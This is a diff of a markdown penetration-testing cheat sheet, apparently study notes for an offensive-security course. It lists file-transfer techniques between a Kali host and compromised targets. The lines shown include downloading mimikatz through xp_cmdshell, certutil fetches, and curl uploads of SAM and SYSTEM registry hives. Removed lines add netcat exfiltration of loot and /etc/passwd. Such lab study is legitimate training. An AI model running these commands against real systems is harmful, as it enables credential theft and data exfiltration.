@@ -267,6 +267,40 @@ Kali port:
 [PEN-200 Transferring file from Windows machine to local Kali VM](https://discordapp.com/channels/780824470113615893/1148907181480104028/1148907181480104028)
  
 - **Window**
+  - **Transfer back/forth to Windows target**
+    ```
+    #RDP mounting shared folder
+    `xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:<IP_ADD> /cert:ignore /drive:share,/home/kali/share`  
+    `rdesktop -u <USERNAME> -p <PASSWORD> -d corp.com -r disk:share=/home/kali/share <IP_ADD>`
+
+    ###To target Windows###
+    ##Netcat
+    cd /var/www/html
+    sudo python3 -m http.server 80
+    nc <target> <port>
+    iwr -uri http://<kali>/<program> -Outfile <program>
+
+    ##Certutil
+    certutil -urlcache -f http://<Kali-IP>/file.exe file.exe
+
+    ##SQL
+    EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://<kali>:1234/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'
+    
+    ###From Windows to Kali###
+
+    ###From netcat to Kali###
+    ##UploadServer
+    --Kali terminal
+    mkdir -p /home/kali/uploads
+    cd /home/kali/uploads
+    pipx install uploadserver
+    pipx run uploadserver --directory /home/kali/uploads 8008
+
+    --target terminal
+    curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\sam"
+    curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\system"
+    curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\winPEAS-results.txt"
+    ```
   - **C:\Windows\System32\config\SAM**
   - **C:\Windows\System32\config\SYSTEM**
   - C:\Windows\System32\config\SECURITY
@@ -279,10 +313,15 @@ Kali port:
   - **Flag: local.txt, proof.txt**
 
 - **Linux**
-  - Transfer back/forth to Linux target
+  - **Transfer back/forth to Linux target**
     ```
-    scp linpeas.sh user@target:
-    scp <user>@<target>:/home/joe/output.txt /home/kali/share/results/
+    ###To target Linux###
+    scp <linpeas.sh> <user>@<target>:/tmp/
+    scp -P 2222 <linpeas.sh> <user>@<target>:/tmp/
+   
+    ###From Linux to Kali###
+    scp <user>@<target>:/tmp/output.txt /home/kali/share/results/
+    scp -P 2222 <user>@<target>:/tmp/output.txt /home/kali/share/results/
     ```
   - **SSH keys**
     - ~/.ssh/id_rsa → private key
@@ -298,94 +337,7 @@ Kali port:
   - **Sensitive files for privilege escalation**
     - SUID/SGID binaries you plan to analyze `find / -perm -4000 -type f 2>/dev/null`
     - Scripts with plaintext passwords in /usr/local/bin, /opt/, or /home/*
-- Windows from/to Kali
-  - **RDP mounting shared folder**  
-    `xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:<IP_ADD> /cert:ignore /drive:share,/home/kali/share`  
-    `rdesktop -u <USERNAME> -p <PASSWORD> -d corp.com -r disk:share=/home/kali/share <IP_ADD>`
-- **Transfer exploits to Kali**
-  - ❗**`scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`** 
-- **Transfer exploits to windows**
-   -  ```
-      cd /var/www/html
-      sudo python3 -m http.server 80
-      nc <target> <port>
-      iwr -uri http://<kali>/<program> -Outfile <program>  
-      ```
-   - `certutil -urlcache -f http://<Kali-IP>/file.exe file.exe`
-   -  `EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://10.10.201.147:1235/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'`
-   -  Target execute the payload over internet
-      ```
-      download the package from https://github.com/gentilkiwi/mimikatz/releases
-      unzip to /home/kali/offsec/tools/minikatz
-      cd to /home/kali/offsec/tools/minikatz/x64
-      python3 -m http.server 80
-
-      target open the http://<KALI>
-      ```
-- Windows to Kali 
-  - Internet access
-    - ❗**UploadServer (nc, No GUI, no credentails)**
-      ```
-      #kali
-      mkdir -p /home/kali/uploads
-      cd /home/kali/uploads
-      pipx install uploadserver
-      pipx run uploadserver --directory /home/kali/uploads 8008
-
-      #target
-      curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\enterpriseuser\sam"
-      curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\enterpriseuser\system"
-      curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\enterpriseuser\winPEAS-results.txt"
-      ```
-    - WsgiDAV
-      ```
-      sudo apt install pipx -y
-      pipx ensurepath
-      pipx install wsgidav
-      mkdir ~/share
-
-      wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share
-      Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
-      ```
-   - No internet access
-     ```
-     #SMB
-     kali: impacket-smbserver share /tmp/smb
-     target: copy C:\path\to\file.txt \\<Kali-IP>\share\
-
-     smbclient -L \\\\192.168.171.10
-     smbclient \\\\192.168.171.10\\<SHARE FOLDER NAME> -N #anonymous access
-     smb: \> ls
-     smb: \offsec\Downloads\> get flag.txt
-     
-     #Netcat
-     kali: nc -lvnp 4444 > loot.txt
-     target: type C:\path\to\loot.txt | nc.exe <Kali-IP> 4444
-      
-     #Base64 encode
-     windows: certutil -encode C:\loot\file.txt file.b6
-     kali: base64 -d file.b64 > file.txt
-     ```
-- Linux to Kali
-  - Internet acces
-    - Net cat
-      ```
-      # On Kali (receiver)
-      nc -lvnp 4444 > file.txt
-      # On target (sender)
-      nc <kali_ip> 4444 < file.txt
-      ```
-  - No internet access
-    - Netcat reverse file transfer
-      ```
-      # On Kali (listener to receive file)
-      nc -lvnp 9001 > loot.tar.gz
-      # On target (send file)
-      tar czf - /etc/passwd | nc <kali_ip> 9001
-      ```
-    - SCP
-      `scp file.txt kali@<kali_ip>:/home/kali/`
-      
+  
 # Web application attack  
 - **Cross-site scripting**
   - ⚠️ **Goal: steal cookies, CSRF admin request**  
